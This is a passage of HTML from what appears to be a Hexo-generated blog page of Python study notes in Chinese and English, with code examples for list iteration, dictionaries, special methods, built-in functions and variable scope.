&#x27;a&#x27;, 2: &#x27;b&#x27;&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove when iterate</span></span><br><span class="line">L = [&#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>&#125;, &#123;<span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;c&#x27;</span>&#125;]</span><br><span class="line"><span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(L):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> <span class="keyword">in</span> item:</span><br><span class="line">        L.pop(i)</span><br><span class="line"><span class="built_in">print</span>(L)                        <span class="comment"># [&#123;1: &#x27;a&#x27;&#125;, &#123;3: &#x27;c&#x27;&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iterate multi-list</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">L1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">L2 = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(itertools.chain(L1, L2)):</span><br><span class="line">    <span class="built_in">print</span>((i, item))   <span class="comment"># (0, &#x27;a&#x27;) (1, &#x27;b&#x27;) (2, &#x27;c&#x27;) (3, &#x27;d&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iterate after reverse</span></span><br><span class="line">L = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">reversed</span>(L)):</span><br><span class="line">    <span class="built_in">print</span>((i, item))   <span class="comment"># (0, &#x27;c&#x27;) (1, &#x27;b&#x27;) (2, &#x27;a&#x27;)</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="dictionary"><a href="#dictionary" class="headerlink" title="dictionary"></a>dictionary</h3><p><a href="https://stackoverflow.com/questions/3975376/understanding-dict-copy-shallow-or-deep">Understanding dict.copy() - shallow or deep?</a></p>
<ul>
<li>dict是mutable对象，也是iterable对象</li>
</ul>
<div class="tabs" id="dictionary"><ul class="nav-tabs"><li class="tab active"><a href="#dictionary-1">basic</a></li><li class="tab"><a href="#dictionary-2">extend</a></li><li class="tab"><a href="#dictionary-3">key2attr</a></li><li class="tab"><a href="#dictionary-4">bad: AsParameter</a></li></ul><div class="tab-content"><div class="tab-pane active" id="dictionary-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># create</span></span><br><span class="line">d1 = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]&#125;</span><br><span class="line">d2 = <span class="built_in">dict</span>(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>&#125;)      <span class="comment"># &#123;&#x27;a&#x27;: 1, 2: &#x27;b&#x27;&#125;</span></span><br><span class="line">d3 = <span class="built_in">dict</span>([(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>)])  <span class="comment"># &#123;&#x27;a&#x27;: 1, 2: &#x27;b&#x27;&#125;</span></span><br><span class="line">d4 = &#123;k:v <span class="keyword">for</span> k,v <span class="keyword">in</span> d3.items()&#125; <span class="comment"># &#123;&#x27;a&#x27;: 1, 2: &#x27;b&#x27;&#125;</span></span><br><span class="line">d5 = <span class="built_in">dict</span>(a=<span class="number">1</span>)                   <span class="comment"># &#123;&#x27;a&#x27;: 1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># access</span></span><br><span class="line"><span class="built_in">print</span>(d1[<span class="string">&#x27;a&#x27;</span>], d1[<span class="number">2</span>], d1.get(<span class="string">&#x27;c&#x27;</span>))  <span class="comment"># 1 b [3, 4, 5]</span></span><br><span class="line"><span class="built_in">print</span>(d1.get(<span class="string">&#x27;z&#x27;</span>))                  <span class="comment"># None (key not exist)</span></span><br><span class="line"><span class="built_in">print</span>(d1.get(<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;default&#x27;</span>))       <span class="comment"># default (default value when key not exist)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># append</span></span><br><span class="line">d2[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span></span><br><span class="line">d3.update(&#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(d2, d3, sep=os.linesep)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">d2[<span class="string">&#x27;a&#x27;</span>] = <span class="number">11</span></span><br><span class="line">d3.update(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">11</span>&#125;)    <span class="comment"># return None</span></span><br><span class="line"><span class="built_in">print</span>(d2, d3, sep=os.linesep)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove</span></span><br><span class="line">d1.clear(); <span class="built_in">print</span>(d1)   <span class="comment"># &#123;&#125;</span></span><br><span class="line"><span class="keyword">del</span> d2[<span class="string">&#x27;a&#x27;</span>]; <span class="built_in">print</span>(d2)  <span class="comment"># &#123;2: &#x27;b&#x27;, &#x27;c&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(d3.pop(<span class="string">&#x27;a&#x27;</span>), d3)  <span class="comment"># 11 &#123;2: &#x27;b&#x27;, &#x27;c&#x27;: 3&#125;</span></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> <span class="built_in">list</span>(d3.items()): <span class="comment"># iterate in list</span></span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">2</span> <span class="keyword">or</span> key == <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">        d3.pop(key)     <span class="comment"># remove multi-key from dict</span></span><br><span class="line"><span class="built_in">print</span>(d3)               <span class="comment"># &#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iterate</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d2:</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> d2.values():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> d2.items():</span><br><span class="line">    <span class="built_in">print</span>(k, <span class="string">&#x27;:&#x27;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="comment"># truth</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> d3) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span> <span class="keyword">in</span> d3)       <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy</span></span><br><span class="line">D = &#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line">E = <span class="built_in">dict</span>(D); E[<span class="number">1</span>] = <span class="string">&#x27;aa&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(D, E) <span class="comment"># &#123;1: &#x27;a&#x27;&#125; &#123;1: &#x27;aa&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(&#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>&#125;.items()))  <span class="comment"># [(1, &#x27;a&#x27;), (2, &#x27;b&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sort</span></span><br><span class="line">D = &#123;<span class="number">3</span>: <span class="string">&quot;c&quot;</span>, <span class="number">1</span>: <span class="string">&quot;a&quot;</span>, <span class="number">2</span>: <span class="string">&quot;b&quot;</span>&#125;</span><br><span class="line">S = <span class="built_in">sorted</span>(D.items(), key=<span class="keyword">lambda</span> item : item[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(D, S) <span class="comment"># &#123;3: &#x27;c&#x27;, 1: &#x27;a&#x27;, 2: &#x27;b&#x27;&#125; [(1, &#x27;a&#x27;), (2, &#x27;b&#x27;), (3, &#x27;c&#x27;)]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="dictionary-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(*d.keys(), *d.values()) <span class="comment"># a b c 1 2 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># access partial value</span></span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="built_in">print</span>(itemgetter(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;)) <span class="comment"># (1, 3)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="dictionary-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **dict_data</span>):</span><br><span class="line">        self.__dict__ = dict_data  <span class="comment"># &#123;key: value&#125; to self.key = value</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, item</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(self, item) <span class="comment"># self[item] to self.item</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(**&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(self.b)    <span class="comment"># 2</span></span><br><span class="line">        <span class="built_in">print</span>(self[<span class="string">&#x27;c&#x27;</span>]) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B())</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="dictionary-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x = <span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">        self.x = x</span><br><span class="line"></span><br><span class="line">m = A()</span><br><span class="line">n = A()</span><br><span class="line">n.x.update(&#123;<span class="number">1</span>: <span class="string">&#x27;o&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(m.x) <span class="comment"># &#123;1: &#x27;o&#x27;&#125; it&#x27;s terriable!</span></span><br><span class="line"><span class="built_in">print</span>(n.x) <span class="comment"># &#123;1: &#x27;o&#x27;&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h2><h3 id="str"><a href="#str" class="headerlink" title="__str__"></a><code>__str__</code></h3><p><a href="https://docs.python.org/3/reference/datamodel.html">object.<strong>str</strong>(self)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, color, mileage</span>):</span><br><span class="line">        self.color = color</span><br><span class="line">        self.mileage = mileage</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a &#123;self.color&#125; car&#x27;</span>.<span class="built_in">format</span>(self=self)</span><br><span class="line"></span><br><span class="line">car = Car(<span class="string">&#x27;red&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"><span class="built_in">print</span>(car) <span class="comment"># a red car</span></span><br></pre></td></tr></table></figure>

<h3 id="iter"><a href="#iter" class="headerlink" title="__iter__"></a><code>__iter__</code></h3><div class="tabs" id="class_method_iter"><ul class="nav-tabs"><li class="tab active"><a href="#class_method_iter-1">basic</a></li><li class="tab"><a href="#class_method_iter-2">object2str</a></li></ul><div class="tab-content"><div class="tab-pane active" id="class_method_iter-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="string">&quot;1&quot;</span></span><br><span class="line">        self.b = <span class="string">&quot;2&quot;</span></span><br><span class="line">        self.c = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> self.__dict__.items():</span><br><span class="line">            <span class="keyword">yield</span> k, v</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dict</span>(A())) <span class="comment"># &#123;&#x27;a&#x27;: &#x27;1&#x27;, &#x27;b&#x27;: &#x27;2&#x27;, &#x27;c&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="class_method_iter-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    IGNORE_KEYS = []</span><br><span class="line">    TO_STR_KEYS = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> copy.deepcopy(self.__dict__).items():</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> value:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> self.IGNORE_KEYS:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> self.TO_STR_KEYS:</span><br><span class="line">                value = <span class="built_in">str</span>(value)</span><br><span class="line"></span><br><span class="line">            new_value = value</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, A):</span><br><span class="line">                new_value = <span class="built_in">dict</span>(value)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                <span class="keyword">for</span> key2, value2 <span class="keyword">in</span> value.items():</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value2, A):</span><br><span class="line">                        new_value[key2] = <span class="built_in">dict</span>(value2)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        new_value[key2] = value2</span><br><span class="line">            <span class="keyword">yield</span> key, new_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">dict</span>(self))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    IGNORE_KEYS = [<span class="string">&quot;n&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.m = <span class="number">1</span></span><br><span class="line">        self.n = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B())  <span class="comment"># &#123;&#x27;m&#x27;: 1&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Build-in-Functions"><a href="#Build-in-Functions" class="headerlink" title="Build-in Functions"></a>Build-in Functions</h2><h3 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate()"></a>enumerate()</h3><p><a href="https://docs.python.org/3/library/functions.html#enumerate">enumerate(iterable, start&#x3D;0)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">enumerate</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]))                 <span class="comment"># &lt;enumerate object at 0x7faf6a418a80&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">enumerate</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])))           <span class="comment"># [(0, &#x27;a&#x27;), (1, &#x27;b&#x27;)]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">enumerate</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>], start=<span class="number">1</span>)))  <span class="comment"># [(1, &#x27;a&#x27;), (2, &#x27;b&#x27;)]</span></span><br><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]):       <span class="comment"># 0 a 1 b</span></span><br><span class="line">    <span class="built_in">print</span>(i, value)</span><br></pre></td></tr></table></figure>

<h3 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h3><p><a href="https://docs.python.org/3/library/functions.html#isinstance">isinstance(object, classinfo)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="literal">True</span>, <span class="built_in">bool</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">1</span>, <span class="built_in">bool</span>))    <span class="comment"># False</span></span><br></pre></td></tr></table></figure>

<h3 id="len"><a href="#len" class="headerlink" title="len()"></a>len()</h3><p><a href="https://docs.python.org/3/library/functions.html#len">len(s)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="literal">None</span>)   <span class="comment">#TypeError: object of type &#x27;NoneType&#x27; has no len()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&quot;abc&quot;</span>))              <span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]))    <span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(&#123;<span class="number">11</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;b&#x27;</span>&#125;)) <span class="comment"># 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>([&#123;<span class="number">1</span>,<span class="number">2</span>&#125;, <span class="number">3</span>]))         <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>

<h3 id="sum"><a href="#sum" class="headerlink" title="sum()"></a>sum()</h3><p><a href="https://docs.python.org/3/library/functions.html#sum">sum(iterable, start&#x3D;0)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))      <span class="comment"># 6</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">100</span>)) <span class="comment"># 106</span></span><br></pre></td></tr></table></figure>

<h3 id="zip"><a href="#zip" class="headerlink" title="zip()"></a>zip()</h3><p><a href="https://docs.python.org/3/library/functions.html#vars">zip(*iterables, strict&#x3D;False)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">zip</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(item) <span class="comment"># (1, &#x27;a&#x27;) (2, &#x27;b&#x27;) (3, &#x27;c&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])))  <span class="comment"># &#123;1: &#x27;a&#x27;, 2: &#x27;b&#x27;, 3: &#x27;c&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Scope-of-Variables"><a href="#Scope-of-Variables" class="headerlink" title="Scope of Variables"></a>Scope of Variables</h2><ul>
<li>LEGB rule (优先级从上到下依次递减):<ul>
<li>local：函数内定义的变量，作用域在函数内部；</li>
<li>enclosing：在嵌套函数中，当前函数中声明的变量，在内部函数中依然是可见的，反之不行。<ul>
<li><strong>在内部函数中修改外部函数定义的变量时，需使用<code>nonlocal</code>关键字，否则内部函数会新建同名的local变量。</strong></li>
</ul>
</li>
<li>global: 在函数外定义的变量，作用域在整个程序内可见。<ul>
<li><strong>在函数内修改global变量时，需使用<code>global</code>关键字，否则函数会新建同名的local变量。</strong></li>
</ul>
</li>
<li>built-in: 关键字，在所有地方均可见。<br><strong>NOTE</strong>: python中没有块级作用域，因此代码块中的local变量在当前函数内都是可见的。</li>
</ul>
</li>
</ul>
<div class="tabs" id="scope_of_variables"><ul class="nav-tabs"><li class="tab active"><a href="#scope_of_variables-1">local</a></li><li class="tab"><a href="#scope_of_variables-2">enclosing</a></li><li class="tab"><a href="#scope_of_variables-3">global</a></li><li class="tab"><a href="#scope_of_variables-4">accessSpeed</a></li><li class="tab"><a href="#scope_of_variables-5">inherit</a></li></ul><div class="tab-content"><div class="tab-pane active" id="scope_of_variables-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_number</span>():</span><br><span class="line">    first_num = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The first number defined is: &quot;</span>, first_num)</span><br><span class="line"></span><br><span class="line">print_number()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first number defined is: &quot;</span>, first_num) <span class="comment"># NameError: name &#x27;first_num&#x27; is not defined</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="scope_of_variables-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    first_num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> first_num</span><br><span class="line">        first_num = <span class="number">0</span></span><br><span class="line">        second_num = <span class="number">2</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Outer&#x27;s variables have a larger scope and can be accessed from the enclosed function inner()</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;first_num from outer: &quot;</span>, first_num)    <span class="comment"># 0</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;second_num from inner: &quot;</span>, second_num)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;first_num at outer: &quot;</span>, first_num)     <span class="comment"># 0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;second_num from inner: &quot;</span>, second_num) <span class="comment"># NameError: name &#x27;second_num&#x27; is not defined</span></span><br><span class="line"></span><br><span class="line">outer()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="scope_of_variables-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greeting_world</span>():</span><br><span class="line">    world = <span class="string">&quot;World&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(greeting, world)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greeting_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(greeting, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_greeting</span>(<span class="params">new_greeting</span>):</span><br><span class="line">    <span class="keyword">global</span> greeting</span><br><span class="line">    greeting = new_greeting</span><br><span class="line"></span><br><span class="line">greeting_world()          <span class="comment"># Hello World</span></span><br><span class="line">greeting_name(<span class="string">&quot;Samuel&quot;</span>)   <span class="comment"># Hello Samuel</span></span><br><span class="line"></span><br><span class="line">change_greeting(<span class="string">&quot;Hi&quot;</span>)</span><br><span class="line">greeting_world()          <span class="comment"># Hi World</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="scope_of_variables-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line">setup=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">XGLOBAL= 5</span></span><br><span class="line"><span class="string">class A:</span></span><br><span class="line"><span class="string">    xclass = 5</span></span><br><span class="line"><span class="string">    def __init__(self):</span></span><br><span class="line"><span class="string">        self.xinstance = 5</span></span><br><span class="line"><span class="string">    def f1(self):</span></span><br><span class="line"><span class="string">        xlocal = 5</span></span><br><span class="line"><span class="string">        x = self.xinstance  # instance variable</span></span><br><span class="line"><span class="string">    def f2(self):</span></span><br><span class="line"><span class="string">        xlocal = 5</span></span><br><span class="line"><span class="string">        x = A.xclass        # class variable</span></span><br><span class="line"><span class="string">    def f3(self):</span></span><br><span class="line"><span class="string">        xlocal = 5</span></span><br><span class="line"><span class="string">        x = XGLOBAL         # module variable</span></span><br><span class="line"><span class="string">    def f4(self):</span></span><br><span class="line"><span class="string">        xlocal = 5</span></span><br><span class="line"><span class="string">        x = xlocal          # local variable</span></span><br><span class="line"><span class="string">a = A()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;access via instance variable: %.3f&#x27;</span> % timeit.timeit(<span class="string">&#x27;a.f1()&#x27;</span>, setup=setup, number=<span class="number">300000000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;access via class variable: %.3f&#x27;</span> % timeit.timeit(<span class="string">&#x27;a.f2()&#x27;</span>, setup=setup, number=<span class="number">300000000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;access via module variable: %.3f&#x27;</span> % timeit.timeit(<span class="string">&#x27;a.f3()&#x27;</span>, setup=setup, number=<span class="number">300000000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;access via local variable: %.3f&#x27;</span> % timeit.timeit(<span class="string">&#x27;a.f4()&#x27;</span>, setup=setup, number=<span class="number">300000000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">access via instance variable: 27.857</span></span><br><span class="line"><span class="string">access via class variable: 27.019</span></span><br><span class="line"><span class="string">access via module variable: 23.345</span></span><br><span class="line"><span class="string">access via local variable: 22.284</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="scope_of_variables-5"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">G = <span class="number">1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    X = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.m = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;G=&#125;</span> <span class="subst">&#123;A.X=&#125;</span> <span class="subst">&#123;self.X=&#125;</span> <span class="subst">&#123;self.m=&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    X = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.m = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A.X适合读写场景，self.X只适合只读场景</span></span><br><span class="line"><span class="built_in">print</span>(A()) <span class="comment"># G=1 A.X=2 self.X=2 self.m=3</span></span><br><span 